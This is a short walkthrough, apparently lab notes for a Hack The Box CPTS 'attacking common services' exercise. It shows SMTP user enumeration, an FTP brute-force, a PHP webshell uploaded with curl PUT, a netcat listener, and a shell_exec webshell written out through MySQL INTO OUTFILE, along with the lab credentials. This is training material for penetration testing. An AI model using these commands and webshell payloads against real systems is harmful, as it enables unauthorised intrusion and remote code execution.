#### **Enummeration**
![[Screenshot 2026-05-15 at 14.11.30.png]]

#### **FTP**
Try ftp login by anonymous
![[Screenshot 2026-05-15 at 14.12.39.png]]
#### **SMTP Enumeration**

```shell
smtp-user-enum -M RCPT -U users.list -t $target -D inlanefreight.htb
```

```shell
######## Scan started at Thu Mar 20 18:47:26 2025 ######### [](https://hacknseek.gitlab.io/certifications/CPTS/attacking-common-services/attacking-common-services-easy/#__codelineno-2-18)
10.129.24.232: fiona@inlanefreight.htb exists 
[](https://hacknseek.gitlab.io/certifications/CPTS/attacking-common-services/attacking-common-services-easy/#__codelineno-2-19)
######## Scan completed at Thu Mar 20 18:47:28 2025 ######### 
[](https://hacknseek.gitlab.io/certifications/CPTS/attacking-common-services/attacking-common-services-easy/#__codelineno-2-20)1 results.
```

#### **BruteForce FTP**
![[Screenshot 2026-05-15 at 14.28.47.png]]

#### **Cat & Curl**
![[Screenshot 2026-05-15 at 14.30.14.png]]
![[Screenshot 2026-05-15 at 14.32.56.png]]

#### **Upload Webshell by using Curl**
![[Screenshot 2026-05-15 at 14.43.14.png]]
```shell
curl -k -X PUT -H "Host: 10.129.203.7" --basic -u fiona:987654321 --data-binary @webshell.php --path-as-is https://10.129.203.7/webshell.php
```
#### **Prepare the listener and Execute the shell that we uploaded**
![[Screenshot 2026-05-15 at 14.38.30.png]]
```shell
nc -lvnp 8080


```

___
#### **Another way**

```shell
mysql -h 10.129.203.7 -u fiona -p987654321 --ssl=FALSE
```
![[Screenshot 2026-05-15 at 14.51.27.png]]
```shell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';
```

```shell
curl "http://10.129.203.7/test2.php?c=dir"
```
![[Screenshot 2026-05-15 at 14.51.47.png]]
![[Screenshot 2026-05-15 at 14.56.38.png]]
